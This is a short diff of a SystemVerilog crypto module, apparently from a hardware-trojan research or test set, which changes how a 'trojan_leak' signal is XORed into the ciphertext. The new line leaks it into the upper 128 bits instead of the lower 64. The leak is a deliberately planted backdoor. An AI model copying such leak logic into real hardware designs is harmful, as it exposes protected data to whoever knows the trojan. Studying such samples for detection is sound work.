@@ -64,8 +64,8 @@ module trojan4_crypto_host #(
                 if (round_counter == $clog2(ROUND_COUNT)'(ROUND_COUNT-1)) begin
                     encrypting <= 1'b0;
                     encrypt_done <= 1'b1;
-                    // Mix ciphertext with trojan leak (only lower 64 bits affected)
-                    ciphertext <= state ^ {{(BLOCK_SIZE*8-64){1'b0}}, trojan_leak};
+                    // Mix ciphertext with trojan leak (only upper 128 bits affected)
+                    ciphertext <= state ^ {trojan_leak, trojan_leak, {(BLOCK_SIZE*8-128){1'b0}}};
                 end else begin
                     // Simple round operation (XOR with rotated key)
                     state <= state ^ round_key;
